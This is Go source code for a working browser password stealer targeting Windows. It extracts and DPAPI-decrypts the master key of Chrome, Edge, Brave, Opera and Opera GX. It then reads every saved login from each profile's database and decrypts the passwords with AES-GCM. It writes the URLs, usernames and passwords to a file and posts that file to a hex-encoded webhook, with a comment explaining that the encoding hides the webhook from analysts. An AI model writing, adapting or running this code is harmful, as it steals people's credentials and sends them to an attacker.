package main

import (
	"os"
	"io"
	"bytes"
	"regexp"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"encoding/hex"
	"database/sql"
	"net/http"
	"io/ioutil"
	"path/filepath"
	"mime/multipart"
	_ "github.com/mattn/go-sqlite3"
	dpapi "github.com/billgraziano/dpapi"
)

var (
	BroswPath=os.Getenv("USERPROFILE")+"\\AppData\\Local"
	Tmpfile=os.Getenv("APPDATA")+"\\tmp.dat"
	Outfile=os.Getenv("APPDATA")+"\\lebron_out.txt"
	Chrome="\\Google\\Chrome\\User Data"
	Edge="\\Microsoft\\Edge\\User Data"
	Brave="\\BraveSoftware\\Brave-Browser\\User Data"
	Opera="\\Opera Software\\Opera Stable"
	OperaGX="\\Opera Software\\Opera GX Stable"
)

/*	Your webhook must be hex encoded (without 0x).
	This is just a easy information hiding step to not let someone find your webhook analyzing the string in the executable at first.
*/
const webhook = ""

func secret_key(lspath string)([]byte, error){
	var key []byte
	jason, err := os.Open(lspath)
	if err != nil {
		return key,err
	}
	defer jason.Close()
	byteval, err := ioutil.ReadAll(jason)
	if err != nil {
		return key,err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteval),&result)
	decodedkey, err := base64.StdEncoding.DecodeString(result["os_crypt"].(map[string]interface{})["encrypted_key"].(string))
	key, err = dpapi.DecryptBytes(decodedkey[5:])		//the encrypted key starts with "DPAPI"
	if err != nil{
		return key,err
	}
	return key,nil
}

func decrypt(password, key []byte)(string,error){
	password=password[3:]							//every encrypted password starts with "v10"
	aesdc, _ := aes.NewCipher(key)
	gcm, err := cipher.NewGCM(aesdc)
	noncesize := gcm.NonceSize()
	if len(password) < noncesize {
		return "",err
	}
	nonce, password := password[:noncesize], password[noncesize:]
	result, err := gcm.Open(nil, nonce, password, nil)
	if err != nil {
		return "",err
	}
	return string(result), nil
}

func create_db_connection(pathdb string)(*sql.DB, error) {
	sourceFile, err := os.Open(pathdb)
	if err != nil {
		return nil, err
	}
	defer sourceFile.Close()
	destinationFile, err := os.Create(Tmpfile)
	if err != nil {
		return nil, err
	}
	defer destinationFile.Close()
	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return nil, err
	}
	db, err := sql.Open("sqlite3", Tmpfile)
	if err != nil {
		return nil, err
	}
	return db, nil
}

func let_him_cook(path string)(){
	f, _ := os.OpenFile(Outfile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	secret, err := secret_key(path+"\\Local State")
	if err != nil {
		return
	}
	folders, err := os.ReadDir(path)
	if err != nil {
		return
	}
	var profiles []string
	profiles=append(profiles, "")		//this is just for opera GX
	for _, folder := range folders {
		if match, _ := regexp.MatchString("^Profile*|^Default$",folder.Name());match{
			profiles = append(profiles, folder.Name())
		}
	}
	for _, folder := range profiles {
		ppath := filepath.Join(path,folder,"Login Data")
		f.WriteString(ppath+"\n\n")
		var conn, err=create_db_connection(ppath)
		if err != nil {
			continue
		}
		cursor, err := conn.Query("SELECT action_url, username_value, password_value FROM logins")
		for cursor.Next() {
			var url, username string
			var password []byte
			cursor.Scan(&url, &username, &password)
			if url != "" && username != "" && len(password) > 0 {
				var pass,err = decrypt(password, secret)
				if err != nil {
					continue
				}
				f.WriteString("URL: "+url+"\nUsername: "+username+"\nPassword: "+pass+"\n\n")
			}
		}
		conn.Close()
		os.Remove(Tmpfile)
	}
}

func main(){
	let_him_cook(BroswPath+Chrome)
	let_him_cook(BroswPath+Edge)
	let_him_cook(BroswPath+Brave)
	let_him_cook(os.Getenv("APPDATA")+Opera)
	let_him_cook(os.Getenv("APPDATA")+OperaGX)
	file, _ := os.Open(Outfile)
	defer os.Remove(Outfile)
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", Outfile)
	io.Copy(part, file)
	writer.Close()
	file.Close()
	dhook,_:=hex.DecodeString(webhook)
	http.Post(string(dhook), writer.FormDataContentType(),body)
}
